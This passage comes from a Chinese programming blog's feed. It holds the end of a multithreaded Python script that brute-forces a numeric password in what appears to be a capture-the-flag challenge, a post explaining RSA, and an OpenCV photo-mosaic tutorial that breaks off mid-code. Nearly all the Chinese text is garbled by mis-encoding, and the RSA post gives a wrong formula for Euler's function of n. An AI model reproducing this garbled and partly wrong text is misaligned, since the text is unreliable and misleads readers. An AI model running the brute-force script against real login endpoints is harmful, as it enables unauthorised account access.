å¦‚æœå“åº”ä½“ä¸­å«æœ‰ flag å­—æ ·ï¼Œè¯´æ˜å¯†ç äº‰å–</span></span><br><span class="line">        <span class="comment"># å®é™…ä¸Šä¹Ÿå¯ä»¥å°†æ¯ä¸€ä¸ªå“åº”ä½“çš„é•¿åº¦è¿›è¡Œç»Ÿè®¡ï¼Œå«æœ‰ flag çš„ä¸€èˆ¬è·Ÿå…¶ä»–çš„æ˜¯ä¸ä¸€æ ·çš„</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> test.text:</span><br><span class="line">            print(<span class="string">'The correct password isï¼š'</span>, pas)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        pas += <span class="number">1</span></span><br><span class="line">    print(<span class="string">'thread %s end! '</span> % (name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># ä» 10000-99999  æˆ‘è¿™é‡Œå·æ‡’äº†ï¼ŒæŠŠ0-9999çš„å»æ‰äº† hhhh</span></span><br><span class="line">    start, end = <span class="number">10000</span>, <span class="number">100000</span></span><br><span class="line">    <span class="comment"># çº¿ç¨‹æ€»æ•°</span></span><br><span class="line">    total = <span class="number">500</span></span><br><span class="line">    <span class="comment"># æ¯ä¸ªçº¿ç¨‹è¦çˆ†ç ´çš„åŒºé—´é•¿åº¦</span></span><br><span class="line">    step = int((end - start) / total)</span><br><span class="line">    left = start</span><br><span class="line">    threadsList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(total):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># åˆ›å»ºçº¿ç¨‹å¹¶ä¼ é€’å‚æ•°è¿‡å»</span></span><br><span class="line">            t = threading.Thread(target=hack, args=(<span class="string">"Thread-"</span> + str(i), left, left + step,))</span><br><span class="line">            <span class="comment"># çº¿ç¨‹å¼€å§‹æ‰§è¡Œ</span></span><br><span class="line">            t.start()</span><br><span class="line">            threadsList.append(t)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"Error: unable to start thread"</span>)</span><br><span class="line">        left += step</span><br><span class="line">    <span class="comment"># ä¸»çº¿ç¨‹ç­‰å¾…å…¶ä»–çº¿ç¨‹å®Œæ¯•åå†é€€å‡º</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threadsList:</span><br><span class="line">        t.join()</span><br><span class="line">    print(<span class="string">'main thread end!!'</span>)</span><br></pre></td></tr></table></figure>

<hr>
<p>==é»‘å¸½ç™½å¸½ï¼Œå°±åœ¨ä¸€å¿µä¹‹é—´ï¼==</p>
]]></content>
      <categories>
        <category>ç½‘ç»œæ”»é˜²</category>
      </categories>
      <tags>
        <tag>å¤šçº¿ç¨‹</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>å…¬é’¥å¯†ç ç®—æ³•ä¹‹RSA</title>
    <url>/2022/08/14/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E4%B9%8BRSA/</url>
    <content><![CDATA[<p>æœ¬æ–‡å‚è€ƒè‡ªæ–‡ç« <a href="https://weread.qq.com/web/bookDetail/77d32500721a485577d8eee" target="_blank" rel="noopener">ã€ä»0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ã€‘</a></p>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¬¼ç»Ÿè€Œè¨€ï¼Œå¯†ç å­¦å¯ä»¥åˆ†ä¸ºå¤å…¸å¯†ç å’Œç°ä»£å¯†ç é˜¶æ®µï¼Œå¤å…¸å¯†ç æ¶‰åŠçŸ¥è¯†è¾ƒä¸ºç®€å•ï¼Œå®¹æ˜“ç†è§£ï¼Œç°ä»£å¯†ç èå…¥äº†å¤§é‡æ•°è®ºçŸ¥è¯†ï¼Œå®‰å…¨æ€§èƒ½ä¹Ÿå¤§å¹…æå‡ã€‚</p>
<blockquote>
<p>è‡ªä»ç§‘å…‹éœå¤«åŸåˆ™å’Œå¯¹ç§°åŠ å¯†ä½“åˆ¶è¢«æå‡ºåï¼Œå¯†ç å­¦è¿›å…¥äº†ç°ä»£å¯†ç é˜¶æ®µã€‚æˆç†Ÿçš„åˆ†ç»„å¯†ç ã€æµå¯†ç çš„åŠ å¯†å¼ºåº¦å’ŒåŠ å¯†æ•ˆç‡éƒ½éå¸¸ä¼˜ç§€ï¼Œç„¶è€Œå¯¹ç§°å¯†ç ä½“ç³»å­˜åœ¨ç€ä¸€ä¸ªä¸å¯å¿½ç•¥çš„é—®é¢˜â€”â€”å¯†é’¥çš„ä¼ è¾“éœ€è¦ä¸€ä¸ªå®‰å…¨çš„ä¿¡é“ï¼Œå¦åˆ™ä¸€æ—¦å¯†é’¥è¢«æˆªè·ï¼Œå¯¹ç§°åŠ å¯†å°±æ¯«æ— å®‰å…¨æ€§å¯è¨€ã€‚å¦å¤–ï¼Œå¯¹ç§°åŠ å¯†ä½“åˆ¶å¹¶æ²¡æœ‰è§£å†³ä¿¡æ¯çš„è®¤è¯ä¸ä¸å¯å¦è®¤æ€§çš„é—®é¢˜ã€‚</p>
</blockquote>
<p>1976å¹´,Whitfield Diffieå’ŒMartin Hellmanå‘è¡¨äº†<a href="https://ieeexplore.ieee.org/document/1055638" target="_blank" rel="noopener">New directions in cryptography</a>è¿™ç¯‡åˆ’æ—¶ä»£çš„æ–‡ç« ï¼Œå¥ å®šäº†å…¬é’¥å¯†ç ç³»ç»Ÿçš„åŸºç¡€ï¼Œè€Œåœ¨1977å¹´ï¼ŒRon Rivestã€Adi Shamirå’ŒLeonard Adlemanå‘æ˜äº†ä¸€ç§ç›´åˆ°ä»Šå¤©è¿˜è¢«å¹¿æ³›è¿ç”¨çš„å…¬é’¥å¯†ç ç®—æ³•â€”â€”RSAã€‚</p>
<p>è¯¥ç®—æ³•è¿ç”¨çš„æ•°å­¦åŸç†æ˜¯ï¼šå°†ä¸¤ä¸ªå¤§ç´ æ•°ç›¸ä¹˜æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯è¦æŠŠè¿™ä¸¤ä¸ªç´ æ•°çš„ä¹˜ç§¯è¿›è¡Œå› å¼åˆ†è§£å´æ˜¯åŠå…¶å›°éš¾çš„ã€‚</p>
<a id="more"></a>

<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>ç®—æ³•å¼€å§‹ä¹‹å‰ï¼Œå…ˆé€‰å–ä¸¤ä¸ªè¾ƒå¤§çš„ä¸åŒç´ æ•°<code>p</code>å’Œ<code>q</code>ï¼ˆä¸€èˆ¬å¤§äº<code>512bit</code>ï¼Œå³2^512ï¼‰ã€‚ä»¤ï¼š</p>
<p>$$<br>n=pq<br>$$</p>
<p>å†æ±‚<code>n</code>çš„æ¬§æ‹‰å‡½æ•°ï¼š</p>
<p>$$<br>\varphi (n)=\varphi (p-1)\varphi (q-1)<br>$$</p>
<p>å†é€‰å–ä¸€ä¸ªä¸è¯¥æ¬§æ‹‰å‡½æ•°å€¼äº’è´¨çš„æ•´æ•°<code>e</code>ï¼Œä¸ºäº†åŠ é€Ÿè¿ç®—ï¼Œé€šå¸¸é€‰ä¸€ä¸ªè¾ƒå°ï¼Œä½†ä¸è‡³äºå¤ªå°çš„ç´ æ•°ï¼Œå¦‚65537ã€‚</p>
<p>æ±‚å¾—<code>e</code>æ¨¡$\varphi (n)$çš„é€†å…ƒ<code>d</code>ï¼Œå³ï¼š</p>
<p>$$<br>ed \equiv 1 \pmod{\varphi (n)}<br>$$</p>
<p>ç„¶å<code>&lt;n, e&gt;</code>ä½œä¸ºå…¬é’¥ï¼Œå¯ä»¥å¯¹å¤–å…¬å¸ƒï¼Œä¸ç”¨æ‹…å¿ƒåˆ«äººçªƒå–ï¼Œå¯ä»¥ç”¨äºå‘é€æ–¹åŠ å¯†ä¿¡æ¯ï¼›<code>&lt;n, d&gt;</code>ä½œä¸ºç§é’¥ï¼Œç”¨æˆ·è‡ªå·±ä¿ç•™ï¼Œç”¨äºè§£å¯†ä¿¡æ¯ã€‚</p>
<p><code>RSA</code>ç³»ç»Ÿå·¥ä½œæµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li><p>å‘é€æ¶ˆæ¯åŒæ–¹äº§ç”Ÿå¯†é’¥å¯¹ï¼ˆå…¬é’¥å’Œç§é’¥ï¼‰ï¼Œä¿ç•™ç§é’¥ï¼Œäº¤æ¢å…¬é’¥ã€‚</p>
</li>
<li><p>å‡è®¾é˜¿çè¦ä¼ è¾“ä¿¡æ¯ç»™é˜¿å¼ºï¼Œä¼ è¾“çš„å†…å®¹ä¸º<code>m</code>ï¼Œè®¡ç®—ï¼š</p>
</li>
</ol>
<p>$$<br>   c=m^e\pmod{n},å…¶ä¸­(0\le m\lt n)<br>$$</p>
<ol start="3">
<li><p>é˜¿çå°†<code>c</code>å‘é€ç»™é˜¿å¼º</p>
</li>
<li><p>é˜¿å¼ºæ”¶åˆ°ä¿¡æ¯åï¼Œè®¡ç®—ï¼š</p>
</li>
</ol>
<p>$$<br>   m1=c^d\pmod{n}<br>$$</p>
<ol start="5">
<li>å¯ä»¥éªŒè¯ï¼Œ<code>m1</code>å’Œ<code>m</code>æ˜¯ç›¸ç­‰çš„ã€‚</li>
</ol>
<p>ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼š</p>
<p>å–<code>p=11</code>,<code>q=7</code>ï¼Œåˆ™<code>n=77</code>,å†å–<code>e=13</code>ï¼Œåˆ™<code>d=37</code>(13 x 37 = 481,481 % 60 = 1)ï¼Œå‘é€çš„æ˜æ–‡ä¸º8ï¼š</p>
<p>$$<br>c=8^{13}\pmod{77}=50<br>$$</p>
<p>è§£å¯†ï¼š</p>
<p>$$<br>m=50^{37}\pmod{77}=8<br>$$</p>
<p>ä¸‹é¢æˆ‘ä»¬æ¥è¯æ˜<code>m1</code>å’Œ<code>m</code>æ˜¯ç›¸ç­‰çš„ï¼Œå³$m=c^d\pmod{n}$ï¼Œç”±äºm&lt;n,æ•…åªè¦è¯æ˜ï¼š</p>
<p>$$<br>c^d\equiv m\pmod{n}<br>$$</p>
<p>è€ŒåŠ å¯†çš„æ—¶å€™ï¼š</p>
<p>$$<br>c=m^e\pmod{n}<br>$$</p>
<p>å³ï¼Œåªè¦è¯ï¼š</p>
<p>$$<br>m^{e*d}\equiv m\pmod{n}<br>$$</p>
<p>å› ä¸º<code>e</code>å’Œ<code>d</code>äº’ä¸ºé€†å…ƒï¼Œå³$ed \equiv 1 \pmod{\varphi (n)}$ï¼Œåˆ™å¿…å­˜åœ¨æ•´æ•°kï¼Œä½¿å¾—ï¼š</p>
<p>$$<br>e<em>d=k</em>\varphi (n)+1<br>$$</p>
<p>å­˜åœ¨ä¸¤ç§æƒ…å†µï¼š</p>
<h3 id="æƒ…å†µ1ï¼šmå’Œnäº’ç´ "><a href="#æƒ…å†µ1ï¼šmå’Œnäº’ç´ " class="headerlink" title="æƒ…å†µ1ï¼šmå’Œnäº’ç´ "></a>æƒ…å†µ1ï¼šmå’Œnäº’ç´ </h3><blockquote>
<p>æ¬§æ‹‰å®šç†ï¼šè‹¥ gcd(a, m) =1ï¼Œåˆ™$ a^{\varphi (m)}\equiv 1\pmod{m} $</p>
</blockquote>
<p>må’Œnäº’ç´ ï¼Œæœ‰$  gcd(n, m)=1 $ï¼Œæ ¹æ®æ¬§æ‹‰å®šç†ï¼Œæœ‰</p>
<p>$$<br>m^{\varphi (n)}\equiv 1\pmod{n}<br>$$</p>
<p>å³:</p>
<p>$$<br>m^{e<em>d}\equiv m^{k</em>\varphi (n)+1} \equiv m<em>m^{k</em>\varphi (n)}\equiv m\pmod{n}<br>$$</p>
<p>å¾—è¯ï¼</p>
<h2 id="æƒ…å†µ2ï¼šmå’Œnä¸äº’ç´ "><a href="#æƒ…å†µ2ï¼šmå’Œnä¸äº’ç´ " class="headerlink" title="æƒ…å†µ2ï¼šmå’Œnä¸äº’ç´ "></a>æƒ…å†µ2ï¼šmå’Œnä¸äº’ç´ </h2><p>äºŒè€…ä¸äº’ç´ ï¼Œåˆ™æœ€å¤§å…¬çº¦æ•°ä¸ä¸º1ï¼Œç”±äº$m&lt;n$ï¼Œä¸”$n=pq$ï¼Œpå’Œqéƒ½æ˜¯ç´ æ•°ï¼Œä¸”äºŒè€…ä¸ç­‰ï¼Œæ•…mçš„å› å­ä¸­å¿…å«pæˆ–è€…qä¸­ä¹‹ä¸€ï¼Œä¸”åªå«ä¸€ä¸ªè€Œä¸å«å¦å¤–ä¸€ä¸ªï¼ˆåŒæ—¶å«çš„è¯ï¼Œåˆ™$m&gt;=pq=n$ï¼ŒçŸ›ç›¾ï¼‰ã€‚ä¸å¦¨å«pï¼Œå³å­˜åœ¨$m=cp$ï¼ŒåŒæ—¶mä¸qäº’ç´ ï¼Œç”±è´¹é©¬å°å®šç†å¯å¾—ï¼š</p>
<p>$$<br>m^{q-1}\equiv 1\pmod{q}<br>$$</p>
<blockquote>
<p>è´¹é©¬å°å®šç†ï¼šå¦‚æœqæ˜¯ä¸€ä¸ªè´¨æ•°ï¼Œè€Œæ•´æ•°aä¸æ˜¯qçš„å€æ•°ï¼Œåˆ™æœ‰$a^{q-1}\equiv 1\pmod{q}$</p>
</blockquote>
<p>è¿›ä¸€æ­¥ï¼Œæœ‰ï¼š</p>
<p>$$<br>m^{k\varphi (n)} \equiv m^{k(p-1)(q-1)}\equiv 1^{k(p-1)}\equiv 1 \pmod{q}<br>$$</p>
<p>å³å­˜åœ¨ä¸€ä¸ªæ•´æ•°hï¼Œä½¿å¾—ï¼š</p>
<p>$$<br>m^{k\varphi (n)}=hq+1<br>$$</p>
<p>ä¸¤è¾¹åŒä¹˜ä»¥ä¸€ä¸ªmï¼Œæ³¨æ„ä¸Šæ–‡ä¸­$m=cp$ï¼Œæœ‰ï¼š</p>
<p>$$<br>m^{k\varphi (n)+1}=cp(hq+1)=cphq+m=hcn+m<br>$$</p>
<p>ä¸¤è¾¹æ¨¡nï¼Œæœ‰ï¼š</p>
<p>$$<br>m^{k\varphi (n)+1}\equiv m^{ed}\equiv  m \pmod{n}<br>$$</p>
<p>ç»¼ä¸Šï¼Œè§£å¯†å¾—åˆ°çš„<code>m1</code>å’ŒåŸæ¥çš„æ˜æ–‡<code>m</code>æ˜¯ç›¸ç­‰çš„ã€‚</p>
<h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>RSAå…¬é’¥å¯†ç çš„å®‰å…¨æ€§ä¾èµ–äºå¤§æ•´æ•°å› å¼åˆ†è§£çš„å›°éš¾æ€§ï¼Œå¦‚æœçŸ¥é“äº†på’Œqï¼Œå¾ˆå®¹æ˜“æ±‚å¾—å…¬é’¥eå…³äºæ¨¡$\varphi (n)$çš„é€†å…ƒdã€‚å¦‚æœä¸çŸ¥é“på’Œqï¼ŒæŒ‰ç…§ç°åœ¨çš„è®¡ç®—æœºèƒ½åŠ›ï¼Œå¬è¯´åˆ†è§£ä¸€ä¸ª400ä½æ•´æ•°éœ€è¦èŠ±è´¹ä¸Šäº¿å¹´æ—¶é—´ï¼Œ:D </p>
<p>å½“på’Œqæ˜¯è¶…è¿‡ä¸¤ç™¾ä½çš„ç´ æ•°æ—¶å€™ï¼Œå¯ä»¥ç²—ç•¥åœ°è¯´ï¼ŒRSAæ˜¯æš‚æ—¶å®‰å…¨çš„ã€‚</p>
]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>å¯†ç å­¦</tag>
      </tags>
  </entry>
  <entry>
    <title>å€ŸåŠ©OpenCVæ‹¼æ¥ç‰¹å®šèƒŒæ™¯å›¾</title>
    <url>/2022/01/21/%E5%80%9F%E5%8A%A9OpenCV%E6%8B%BC%E6%8E%A5%E7%89%B9%E5%AE%9A%E8%83%8C%E6%99%AF%E5%9B%BE/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰å°±ä¸€ç›´æœ‰ä¸€ä¸ªæƒ³æ³•ï¼Œæä¾›å¤§é‡å›¾ç‰‡ä»¥åŠä¸€å¼ èƒŒæ™¯å›¾ï¼Œç„¶åå°†è¿™äº›å›¾ç‰‡ç»„æˆä¸€ä¸ªä¸ªå°ç½‘æ ¼æ‹¼æ¥èµ·æ¥ï¼Œç„¶åæ•ˆæœå’ŒåŸèƒŒæ™¯å›¾å·®ä¸å¤šï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯å°†åŸèƒŒæ™¯å›¾é©¬èµ›å…‹åŒ–ï¼Œåªä¸è¿‡æ¯ä¸€ä¸ªé©¬èµ›å…‹æ˜¯ç”¨æä¾›çš„å›¾ç‰‡ç»„æˆï¼Œç°åœ¨æ”¾å¯’å‡äº†ç»ˆäºæœ‰æ—¶é—´å¼€å¹²å•¦ï¼Œå“ˆå“ˆå“ˆå“ˆå“ˆã€‚</p>
<a id="more"></a>

<p>å…ˆçœ‹ä¸‹æ•ˆæœï¼š</p>
<p>åŸèƒŒæ™¯å›¾</p>
<p><img src="https://qiniu.yalexin.top/bgr.jpg" alt></p>
<p>æ‹¼æ¥ç»“æœå›¾</p>
<p><img src="https://qiniu.yalexin.top/cat-mouse.png" alt></p>
<p>emmmï¼Œå‹‰å¼ºèƒ½çœ‹ï¼Œæœ‰ç‚¹æŠ½è±¡</p>
<p>åªèƒ½çœ‹ç¼©ç•¥å›¾äº†</p>
<p><img src="https://qiniu.yalexin.top/thumbnail.png" alt></p>
<p><strong>ä¸è¿‡åªè¦ä½ ç”µè„‘é…ç½®å¤Ÿå¥½ï¼Œæ—¶é—´ä¹Ÿå……è¶³ï¼Œå¯ä»¥å°†å›¾ç‰‡åˆ†å‰²æˆæ›´å¤šçš„å°æ–¹æ ¼ï¼Œæ•ˆæœä¹Ÿæ›´ä½³ã€‚</strong></p>
<h2 id="åŸºæœ¬åŸç†"><a href="#åŸºæœ¬åŸç†" class="headerlink" title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h2><p>åŸºæœ¬åŸç†å…¶å®å¾ˆç®€å•ï¼šå°±æ˜¯é¦–å…ˆè®¡ç®—æ¯ä¸€å¼ ç´ æå›¾ç‰‡çš„é¢œè‰²å¹³å‡å€¼ï¼Œç„¶åè®¡ç®—èƒŒæ™¯å›¾ä¸­çš„æ¯ä¸€ä¸ªå°æ–¹æ ¼çš„é¢œè‰²å¹³å‡å€¼ï¼Œç„¶åä¸¤ä¸¤åŒ¹é…å°±è¡Œäº†ã€‚</p>
<p>ä¸‹é¢è¯´ä¸€ä¸‹å…·ä½“æ“ä½œ</p>
<p>å¯¹äºç´ æï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢æ‰€æåˆ°çš„â€œå¤§é‡å›¾ç‰‡â€ï¼Œæˆ‘è§‰å¾—æœ€å¿«é€Ÿçš„è·å–æ–¹å¼å°±æ˜¯è§†é¢‘ï¼Œæ¯•ç«Ÿä¸€ä¸ªè§†é¢‘é‡Œè¾¹æ¯ä¸€å¸§éƒ½å¯ä»¥ä½œä¸ºä¸€å¼ å›¾ç‰‡ï¼Œå¦‚æœè§†é¢‘æ˜¯<code>24</code>å¸§æ¯ç§’ï¼Œä¸€åˆ†é’Ÿå°±å¯ä»¥æä¾›<code>24*60=1440</code>å¼ å›¾ç‰‡ï¼Œå¯¹äºæˆ‘è¿™ä¸ªä¸€å¹´æ‹çš„ç”Ÿæ´»ç…§éƒ½ä¸è¶…è¿‡200å¼ çš„è“äººæ¥è¯´ï¼Œ<code>1440</code>éš¾ä»¥æƒ³è±¡ã€‚ä½†æ˜¯å¯¹äºè§†é¢‘æ¥è¯´ï¼Œæ¯ä¸€å¸§éƒ½åˆ†æçš„è¯ï¼ŒèŠ±è´¹æ—¶é—´å¤ªå¤šï¼Œå¹¶ä¸”å…¶å®æœ‰ä¸€äº›é‚»è¿‘å¸§çš„å¹³å‡é¢œè‰²<strong>ç›¸å·®ä¸å¤š</strong>ï¼Œä¸ºäº†åŠ å¿«åˆ†æå¯ä»¥å–ä¸€å®šé—´éš”è¿›è¡Œåˆ†æï¼Œ<code>OpenCV</code>ä¹Ÿæä¾›äº†æå–æŒ‡å®šä½ç½®çš„å¸§çš„æ–¹æ³•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cap.set(cv2.CAP_PROP_POS_FRAMES, idx)</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™ä¸ªæ€§èƒ½ä¸Šé¢æ¯”è¾ƒæ…¢ï¼Œæˆ‘ä»¬å¯ä»¥é¡ºåºè¯»å–æ¯ä¸€å¸§ï¼Œç„¶åæ ¹æ®é—´éš”å†åˆ†æï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è§†é¢‘æ€»å¸§æ•°</span></span><br><span class="line">frameNum = cap.get(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># æå–å¸§æ•°çš„æ­¥é•¿</span></span><br><span class="line">step = frameNum // needNum</span><br><span class="line">cnt, idx = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">imgList = []</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    ret, frame = cap.read()</span><br><span class="line">    <span class="keyword">if</span> ret:</span><br><span class="line">        print(<span class="string">'\r'</span> + <span class="string">'-'</span> * (int(idx / frameNum * <span class="number">100</span>)) + str(int(idx / frameNum * <span class="number">100</span>)) + <span class="string">'%'</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> idx % step == <span class="number">0</span>:</span><br><span class="line">            aver = frame.mean(axis=<span class="number">0</span>).mean(axis=<span class="number">0</span>)</span><br><span class="line">            averHex = BGR2HEX(aver)</span><br><span class="line">            <span class="comment"># å…ˆå°†æš‚å­˜å¸§ä¿å­˜èµ·æ¥</span></span><br><span class="line">            cv2.imwrite(PICTURES_DIR + <span class="string">'cache-'</span> + str(cnt) + <span class="string">'.jpg'</span>, frame)</span><br><span class="line">            imgList.append([averHex, PICTURES_DIR + <span class="string">'cache-'</span> + str(cnt) + <span class="string">'.jpg'</span>])</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">imgList.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> imgList</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡å®æµ‹ï¼ŒèŠ±è´¹æ—¶é—´å‡å°‘åˆ°åŸæ¥æ–¹æ³•çš„ä¸€åŠï¼</p>
<p>å¯¹<code>imgList</code>è¿›è¡Œæ’åºæ˜¯æ–¹ä¾¿åé¢åŒ¹é…çš„æ—¶å€™ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾ã€‚</p>
<p>ç¨‹åºä¹Ÿæ”¯æŒè‡ªå·±æä¾›ç´ æå›¾ç‰‡ï¼Œä¸è¿‡è‡ªå·±èƒ½æä¾›å‡ åƒå¼ å›¾ç‰‡ä»¥ä¸Šä¼°è®¡å¾ˆéš¾å§ï¼Ÿï¼Ÿ</p>
<p>ç„¶åè¿›è¡ŒèƒŒæ™¯å›¾çš„åˆ†å‰²ï¼Œç†è®ºä¸ŠèƒŒæ™¯å›¾åˆ†å‰²å¾—è¶Šç²¾ç»†è¶Šå¥½ï¼Œä½†æ˜¯å¦‚æ­¤ä¸€æ¥éœ€è¦åŒ¹é…çš„æ¬¡æ•°å°±è¶Šå¤šï¼Œç¨‹åºè¿è¡Œæ—¶é—´è¶Šå¤šï¼Œè€Œä¸”æ‹¼æ¥å‡ºæ¥çš„å›¾ç‰‡ä¹Ÿå¾ˆå¤§ï¼Œä½†æ˜¯åˆ†å‰²æ•°ç›®å¤ªå°‘ï¼Œæ‹¼æ¥å‡ºæ¥çš„å›¾ç‰‡ä¸åŸå›¾ç›¸å·®ç”šè¿œï¼Œå› æ­¤è¦æŒ‘é€‰å¥½è¦åˆ‡å‰²çš„è¡Œæ•°å’Œåˆ—æ•°ã€‚</p>
<p>åŒ¹é…è¿‡ç¨‹æ¯”è¾ƒå¥½ç†è§£ï¼Œæˆ‘ä»¬å®ç°æŠŠèƒŒæ™¯å›¾åˆ‡å‰²æˆ<code>m*n</code>ä¸ªå°å®«æ ¼ï¼Œè®¡ç®—æ¯ä¸€ä¸ªå°å®«æ ¼çš„å¹³å‡é¢œè‰²ï¼Œç„¶åéå†æ¯ä¸€ä¸ªå°å®«æ ¼ï¼Œåœ¨<code>imgList</code>ä¸­ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾ä¸ä¹‹ç›¸è¿‘çš„å›¾ç‰‡ï¼Œå¹¶æ‹¿åˆ°è¯¥å›¾ç‰‡çš„åå­—å†è¯»å–è¿›æ¥ï¼ˆæˆ‘ä»¬å¹¶ä¸åœ¨<code>imgList</code>ä¸­ä¿å­˜æ¯ä¸€å¼ å›¾ç‰‡ï¼Œå› ä¸ºå¦‚æœæˆ‘ä»¬å¯èƒ½æœ‰å‡ åƒåˆ°ä¸Šä¸‡çš„å›¾ç‰‡ï¼Œå¦‚æœæ¯ä¸€å¼ å›¾éƒ½æœ‰<code>1MB</code>å¤§å°ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦å¥½å‡ ä¸ª<code>GB</code>çš„å†…å­˜ï¼Œè€Œç°åœ¨æˆ‘ä»¬<code>imgList</code>ä¸­æ¯ä¸€ä¸ªå…ƒç´ éƒ½æ˜¯åŒ…å«äº†è¯¥å›¾ç‰‡çš„åå­—å’Œå¹³å‡é¢œè‰²å€¼ï¼‰ï¼Œ è€Œ<code>OpenCV</code>è¯»å–çš„å›¾ç‰‡è¿”å›å€¼æ˜¯çŸ©é˜µï¼Œå›¾ç‰‡çš„æ‹¼æ¥ä¹Ÿå°±æ˜¯å¯¹åº”çŸ©é˜µçš„æ‹¼æ¥ï¼Œä¸è¿‡è¦æ³¨æ„çš„æ˜¯åŒºåˆ†æŒ‰åˆ—æ‹¼æ¥å’ŒæŒ‰è¡Œæ‹¼æ¥ã€‚</p>
<p>å½“ç„¶äº†ä¸ºäº†é˜²æ­¢è¾“å‡ºçš„æ–‡ä»¶è¿‡å¤§ï¼Œæ‹¼æ¥è¿‡ç¨‹è¿˜åº”è¯¥å°†ç´ æå›¾ç‰‡è¿›è¡Œç¼©æ”¾ã€‚</p>
<h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Author      : YaleXin</span></span><br><span class="line"><span class="string">Email       :</span></span><br><span class="line"><span class="string">LastEditors : YaleXin</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> bisect</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§†é¢‘é“¾æ¥</span></span><br><span class="line">VIDEO_URL = <span class="string">"data/mouseAndCat.mp4"</span></span><br><span class="line"><span class="comment"># ç´ æå›¾ç‰‡æ–‡ä»¶å¤¹</span></span><br><span class="line">PICTURES_DIR = <span class="string">"materialPics/"</span></span><br><span class="line"><span class="comment"># èƒŒæ™¯å›¾</span></span><br><span class="line">BACKGROUND_URL = <span class="string">"bgr.jpg"</span></span><br><span class="line"><span class="comment"># è¾“å‡ºå›¾ç‰‡ç»“æœå</span></span><br><span class="line">OUTPUT_PICTURE = <span class="string">"result.jpg"</span></span><br><span class="line"><span class="comment"># ç¼©æ”¾æ¯”ä¾‹</span></span><br><span class="line">ZOOM_FACTOR = <span class="number">4</span></span><br><span class="line"><span class="comment"># åˆ‡å‰²å›¾ç‰‡çš„è¡Œæ•°ã€åˆ—æ•°</span></span><br><span class="line">ROW, COL = <span class="number">41</span>, <span class="number">41</span></span><br><span class="line">cap = cv2.VideoCapture(VIDEO_URL)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†æŒ‡å®šå›¾ç‰‡è¿›è¡Œè£å‰ª m n åˆ†åˆ«æ˜¯è¡Œæ•°åˆ—æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cutBackgroundImg</span><span class="params">(img, m=<span class="number">21</span>, n=<span class="number">21</span>)</span>:</span></span><br><span class="line">    <span class="comment"># èƒŒæ™¯å›¾ç‰‡çš„é«˜åº¦å’Œå®½åº¦</span></span><br><span class="line">    h, w = img.shape[<span class="number">0</span>], img.shape[<span class="number">1</span>]</span><br><span class="line">    grid_h = int(h * <span class="number">1.0</span> / (m - <span class="number">1</span>) + <span class="number">0.5</span>)</span><br><span class="line">    grid_w = int(w * <span class="number">1.0</span> / (n - <span class="number">1</span>) + <span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ»¡è¶³æ•´é™¤å…³ç³»æ—¶çš„é«˜ã€å®½</span></span><br><span class="line">    h = grid_h * (m - <span class="number">1</span>)</span><br><span class="line">    w = grid_w * (n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å›¾åƒç¼©æ”¾</span></span><br><span 